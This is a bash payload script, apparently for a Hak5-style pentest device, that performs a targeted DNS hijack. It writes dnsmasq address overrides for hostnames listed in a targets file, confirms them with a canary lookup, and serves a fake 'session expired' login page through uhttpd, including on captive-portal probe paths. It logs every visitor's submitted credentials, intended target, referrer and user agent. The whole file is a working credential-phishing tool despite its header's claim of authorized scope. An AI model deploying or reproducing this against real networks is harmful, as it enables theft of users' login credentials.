#!/bin/bash
# Title: KB Hijack Start
# Description: Targeted DNS hijack for the network you are authorized to test: hostnames from hijack_targets.txt resolve to the Pager and are served a generic session-expired re-auth page; every visit and credential is logged WITH its intended target. Scope: clients joined to this AP only. Stop with KB Hijack Stop.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

# Mechanics device-proven in KB Portal v1.0 (dnsmasq conf-dir drop + restart ~2s;
# CGI capture via /tmp sink because /root is 0700; uhttpd flag triad -c /dev/null,
# -i .cgi=/bin/sh, NO -P). This payload adds the ONE escalation: instead of asking
# everyone to sign in generically, it answers SPECIFIC hostnames the operator listed.

LOG green "KB Hijack Start v1.0"
canary_ans(){ nslookup "$1" 127.0.0.1 2>/dev/null | awk '/^Name:/{f=1} f&&/^Address:/{print $2; exit}'; }
manual_respawn(){ # last-resort bring-up straight from the generated conf, bypassing
  local GEN
  GEN=$(ls -t /var/etc/dnsmasq.conf.cfg* 2>/dev/null | head -1)
  [ -f "$GEN" ] || return 1
  kill $(pidof dnsmasq) 2>/dev/null; sleep 1
  nohup /usr/sbin/dnsmasq -C "$GEN" -k >/tmp/dnsmasq_manual.log 2>&1 &
  sleep 2
  pidof dnsmasq >/dev/null
}
restart_dnsmasq(){ # kill ALL instances, wait gone, init start; on procd crash-loop
  # backoff (witnessed 2026-09-09: rapid Start/Stop test cycles push procd into
  # "12 crashes" cooldown and start becomes a no-op) wait once, then manual respawn.
  local i
  kill $(pidof dnsmasq) 2>/dev/null
  i=0
  while [ $i -lt 8 ]; do pidof dnsmasq >/dev/null || break; sleep 1; i=$((i+1)); done
  pidof dnsmasq >/dev/null || "$DNSINIT" start >/dev/null 2>&1
  i=0
  while [ $i -lt 12 ]; do pidof dnsmasq >/dev/null && return 0; sleep 1; i=$((i+1)); done
  sleep 25
  "$DNSINIT" start >/dev/null 2>&1
  i=0
  while [ $i -lt 10 ]; do pidof dnsmasq >/dev/null && return 0; sleep 1; i=$((i+1)); done
  manual_respawn
}
reload_dnsmasq(){ # restart + PROVE conf-dir drops loaded: canary $1 answers $IP.
  # Outcome-verified: pid comparison lies on this box (procd respawn races, init
  # restart sometimes no-ops - all failure modes witnessed 2026-09-09).
  local i
  restart_dnsmasq || return 1
  [ -n "$1" ] || return 0
  i=0
  while [ $i -lt 8 ]; do
    [ "$(canary_ans "$1")" = "$IP" ] && return 0
    sleep 1; i=$((i+1))
  done
  return 1
}

STATE=${KBH_STATE:-/root/loot/kbhijack}
ROOTP=${KBH_ROOT:-/root/portals}
MARKER="$STATE/active"
DNSINIT=${KBH_DNSINIT:-/etc/init.d/dnsmasq.hak5}
GENCONF=${KBH_GENCONF:-/var/etc/dnsmasq.conf.cfg*}
TARGETS="$ROOTP/hijack_targets.txt"

mkdir -p "$STATE" 2>/dev/null || { LOG red "cannot create $STATE"; ALERT "No loot dir"; exit 0; }
command -v uhttpd >/dev/null 2>&1 || { LOG red "uhttpd missing - run KB Portal Install first"; ALERT "Run Install"; exit 0; }
[ -f "$TARGETS" ] || { LOG red "$TARGETS missing - ssh in and list one hostname per line"; ALERT "No targets file"; exit 0; }

# self-heal previous killed run
if [ -f "$MARKER" ]; then
  OLD_PID=$(sed -n 's/^PID=//p' "$MARKER" | head -1)
  OLD_DROP=$(sed -n 's/^DROP=//p' "$MARKER" | head -1)
  LOG yellow "previous hijack left running - healing"
  [ -n "$OLD_PID" ] && kill "$OLD_PID" 2>/dev/null
  [ -n "$OLD_DROP" ] && rm -f "$OLD_DROP"
  rm -f "$CONFDIR/kbp_canary.conf" 2>/dev/null
  restart_dnsmasq
  rm -f "$MARKER"
fi

if netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE ":80$"; then
  LOG red "port 80 busy - hijack not started"; ALERT "Port 80 busy"; exit 0
fi

CONFDIR=$(grep -m1 '^conf-dir=' $GENCONF 2>/dev/null | head -1 | cut -d= -f2)
[ -n "$CONFDIR" ] && [ -d "$CONFDIR" ] || { LOG red "dnsmasq conf-dir not found"; ALERT "No conf-dir"; exit 0; }
IP=$(ip -4 addr show br-lan 2>/dev/null | awk '/inet /{split($2,a,"/"); print a[1]; exit}')
[ -n "$IP" ] || { LOG red "no br-lan IPv4 (AP mode?)"; ALERT "No br-lan IP"; exit 0; }

# targets: validate shape, cap the blast radius
THOSTS=$(grep -v '^#' "$TARGETS" | grep -E '^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$' | head -25)
NHOSTS=$(echo "$THOSTS" | grep -c . 2>/dev/null)
[ "${NHOSTS:-0}" -ge 1 ] || { LOG red "no valid hostnames in $TARGETS"; ALERT "Targets file empty"; exit 0; }
[ "$NHOSTS" -le 25 ] || { LOG red "more than 25 targets - trim the file"; ALERT "Too many targets"; exit 0; }

[ -f /root/loot/kb_portal/active ] && LOG yellow "NOTE: KB Portal also active - its wildcard DNS answers ALL names, hijack pages unreachable; stop Portal for this to bite"
LOG cyan "hijacking $NHOSTS hostnames -> $IP (targeted, NOT wildcard)"
CANARY="kbpcanary-$$"
CANFILE="$CONFDIR/kbp_canary.conf"
DROP="$CONFDIR/kbhijack.conf"
: > "$DROP" || { LOG red "cannot write drop"; ALERT "Drop failed"; exit 0; }
echo "$THOSTS" | while read -r H; do echo "address=/$H/$IP" >> "$DROP"; done
# canary proves conf-dir drops loaded on the FRESH instance before we claim
# LIVE (init restart races - witnessed 2026-09-09: old pid sometimes survives the
# restart and drops stay dead; SIGHUP reloads hosts/ethers only, NOT conf-dir)
printf "address=/$CANARY/$IP\n" > "$CANFILE"
if ! reload_dnsmasq "$CANARY"; then
  LOG red "dnsmasq restart failed - reverting drops"; rm -f "$DROP" "$CANFILE"; "$DNSINIT" start >/dev/null 2>&1
  ALERT "DNS reload failed"; exit 0
fi
rm -f "$CANFILE"
LOG green "canary verified: conf-dir drops ACTIVE on pid $(pidof dnsmasq | awk '{print $1}')"

# template resolution: co-located with the payload dir (hak5 installs us there);
# $0-based self-locate for the menu, KBH_TPL override for harness/tests, fixed
# fallback last. A dangling current-symlink = dead docroot = dead server (07:19Z).
TPLSRC=""
_self=$(readlink -f "$0" 2>/dev/null)
[ -n "$_self" ] && [ -f "$(dirname "$_self")/template/session_expired/login.cgi" ] \
  && TPLSRC="$(dirname "$_self")/template/session_expired"
[ -n "$TPLSRC" ] || TPLSRC=${KBH_TPL:-/root/payloads/user/interception/kb_hijack_start/template/session_expired}
[ -f "$TPLSRC/login.cgi" ] || { LOG red "session_expired template missing next to payload - redeploy"; rm -f "$DROP" "$CANFILE"; restart_dnsmasq; ALERT "No template"; exit 0; }
touch /tmp/kbhijack_capture.log; chmod 666 /tmp/kbhijack_capture.log 2>/dev/null
ln -sfn "$TPLSRC" "$ROOTP/current"
uhttpd -c /dev/null -p 80 -h "$ROOTP/current" \
  -i .cgi=/bin/sh -x /cgi-bin \
  -y /generate_204=/login.cgi -y /gen_204=/login.cgi \
  -y /hotspot-detect.html=/login.cgi -y /ncsi.txt=/login.cgi \
  -y /connecttest.txt=/login.cgi \
  >/dev/null 2>&1
sleep 1
PID=$(pidof uhttpd 2>/dev/null | awk '{print $1}')
[ -n "$PID" ] && kill -0 "$PID" 2>/dev/null || {
  LOG red "uhttpd died - reverting DNS"
  rm -f "$DROP" "$STATE/uhttpd.pid"; restart_dnsmasq
  ALERT "Launch failed"; exit 0
}

echo "PID=$PID
DROP=$DROP
CANARY=$CANARY
TPL=session_expired
IP=$IP
TARGETS=$NHOSTS
TS=$(date -u +%FT%TZ)" > "$MARKER"

LOG green "HIJACK LIVE: $NHOSTS hostnames -> $IP pid=$PID"
echo "$THOSTS" | head -6 | sed 's/^/[LIST] /'
[ "$NHOSTS" -gt 6 ] && LOG "... (+$((NHOSTS-6)) more)"
LOG "capture: /tmp/kbhijack_capture.log (target+creds+referrer+UA) - Stop archives"
VIBRATE "Hijack:d=6,o=6,b=250:r" || LOG yellow "vibrate skipped"
ALERT "Hijack live: $NHOSTS targets"
exit 0
